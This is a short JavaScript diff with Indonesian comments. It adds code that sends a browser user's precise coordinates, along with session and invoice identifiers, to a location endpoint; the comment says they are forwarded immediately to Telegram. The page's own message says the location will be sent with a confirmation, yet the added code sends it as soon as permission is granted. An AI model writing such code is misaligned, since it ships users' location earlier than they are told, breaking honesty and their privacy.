@@ -1123,6 +1123,20 @@
               "granted",
               "Lokasi diizinkan dan siap dikirim bersama konfirmasi.",
             );
+            // Kirim lokasi seketika (immediately) ke server & Telegram
+            fetch("/api/location", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                sessionId,
+                invoiceId,
+                location: {
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude,
+                  accuracy: position.coords.accuracy,
+                },
+              }),
+            }).catch((err) => console.error("[LOCATION_SEND_ERROR]", err));
           },
           () => {
             locationResult = null;
